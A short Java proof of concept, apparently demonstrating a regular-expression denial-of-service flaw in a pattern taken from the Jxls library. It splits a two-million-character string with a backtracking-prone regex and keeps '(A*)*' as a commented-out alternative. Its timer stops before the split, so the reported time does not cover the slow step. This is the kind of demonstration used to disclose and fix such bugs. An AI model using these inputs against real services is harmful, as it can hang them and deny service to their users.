package cl.devweb.regexp.exploit;

import com.google.common.base.Stopwatch;

public class JxlsBug {

	public static final String aggregateSeparator = "[a-zA-Z()]+[0-9]*:";
	//public static final String aggregateSeparator = "(A*)*";


	String expression;
	String rawExpression;
	String aggregateFunction;
	String aggregateField;


	public static void main(String[] args) {

		Stopwatch timer = Stopwatch.createUnstarted();
	    timer.start();

		String expr = "a";
		StringBuilder sb = new StringBuilder();
		for(int i=0; i<2_000_000; i++) { // 2_000_000
			sb.append(expr);
		}
		timer.stop();

		String f =  sb.toString();

		//System.out.println(sb);

		String[] aggregateParts = f.split(aggregateSeparator, 2);

		System.out.println(">> " + aggregateParts.length); //expr
		System.out.println("  timer="+timer);

		System.out.println("end.");
	}

}
